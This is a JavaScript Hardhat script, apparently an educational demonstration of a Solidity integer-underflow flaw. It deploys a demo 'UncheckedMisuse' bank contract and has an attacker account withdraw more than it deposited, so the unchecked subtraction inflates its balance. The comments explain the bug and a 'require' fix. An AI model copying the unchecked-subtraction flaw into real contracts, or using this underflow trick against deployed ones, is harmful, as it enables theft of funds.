//
// @dev Simulate a unchecked syntax misuse sample, it can case an uint256 uderflow
// attack.
// @description 'unchecked' syntax can decrease gas burning beacause EVM unchecks
// the solidity code on safe and other aspects when EVM excutes it.
// In this attack sample, `withdraw(uint256 _num)` uses 'unchecked' syntax to
// perform balance subtraction. Attacker calls withdraw func with a big number to
// cause a uint256 underflow situation. So {balance} variable will become a very
// large number.
//
// @notice Below solidity 0.8.0 version, EVM would not check integer underflow 
// situation. You can use 'unchecked' syntax to uncheck integer underflow situation
// in solidity 0.8.0 version. Using 'unchecked' syntax can skip solidity safe 
// check, it would decrease gas burning, but you need keep safe first.
// You can add a 'require' check before 'unchecked' check.
// You can see the gas use is :
// only `unchecked {...}` < directly use(no 'require' and 'uncheck') < `require (...)` and `unchecked {...}`
//
// We should know one thing, all solidity version (0.8.15 now latest) would revert
// transaction when meet with integer overflow condition.
//
// @ reference https://cloud.tencent.com/developer/article/1601507?from=article.detail.1606984
//
const { ethers } = require("hardhat");

const main = async () => {
    const [ owner, attacker ] = await ethers.getSigners();
    const Bank = await ethers.getContractFactory('UncheckedMisuse', owner);
    const bank = await Bank.deploy();
    await bank.deployed();

    console.log(`\n==== Attack is coming 👾 ... ====`);
    console.log(`Attacker deposit 100 wei...`);
    await bank.connect(attacker).deposit(100);
    console.log(`Attacker check his own balance: ${await bank.connect(attacker).balance(attacker.address)} wei`);
    console.log(`Attacker withdraws much more than his balance to cause a underflow attack...`);
    await bank.connect(attacker).withdraw(101);
    console.log(`Again: attacker check his own balance: ${
        ethers.utils.formatEther(
            await bank.connect(attacker).balance(attacker.address)
        )
    } ether\n`);
}

main()
    .then(() => process.exit(0))
    .catch((err) => {
        console.error(err);
        process.exit(1);
    });